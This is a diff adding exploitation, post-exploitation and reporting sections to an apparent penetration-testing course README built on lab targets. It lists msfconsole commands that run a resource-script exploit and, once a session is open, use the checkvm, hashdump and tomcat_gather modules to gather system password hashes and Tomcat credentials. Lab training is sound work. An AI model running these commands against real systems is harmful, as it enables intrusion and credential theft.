@@ -181,13 +181,68 @@ skipfish -o mutillidae http://$MS2/multillidae
 ```
 
 ## Module 04: Exploitation
+Metasploit uses postgresql as detault database, remember to start the postgresql server
 
-Coming Soon
+```
+service postgresql start
+```
+
+Use automation scripts with metasploit
+```
+msfconsole -q -r exploits/exploit_01_vsftpd.rc
+```
+
+Export records from database to a XML file
+```
+msfconsole -q -x "db_export -f xml /root/msf_results.xml"
+```
 
 ## Module 05: Post-Exploitation
 
-Coming Soon
+You need to have an active **meterpreter** session, review exploit/exploit_04
+
+```
+msfconsole -q
+``` 
+
+Check active sessions
+
+```
+msf5 exploit(multi/misc/java_rmi_server) > sessions -l
+```
+
+**checkVM**: This will check if the compromise machine is a Virtual Machine or not
+
+```
+msf5 exploit(multi/misc/java_rmi_server) > use post/linux/gather/checkvm
+msf5 post(linux/gather/checkvm) > set SESSION 1
+SESSION => 1
+msf5 post(linux/gather/checkvm) > run
+```
+
+**hashdump**:
+
+```
+msf5 post(linux/gather/checkvm) > use post/linux/gather/hashdump 
+msf5 post(linux/gather/hashdump) > set SESSION 1
+SESSION => 1
+msf5 post(linux/gather/hashdump) > run
+```
+
+**tomcat_gather**:
+```
+msf5 post(linux/gather/hashdump) > use post/multi/gather/tomcat_gather 
+msf5 post(multi/gather/tomcat_gather) > set SESSION 1
+SESSION => 1
+msf5 post(multi/gather/tomcat_gather) > run
+```
+
 
 ## Module 06: Reporting
 
-Coming Soon
+### Dradis
+
+Execute the command and visit http://localhost:3000 with your browser
+```
+service dradis start
+```
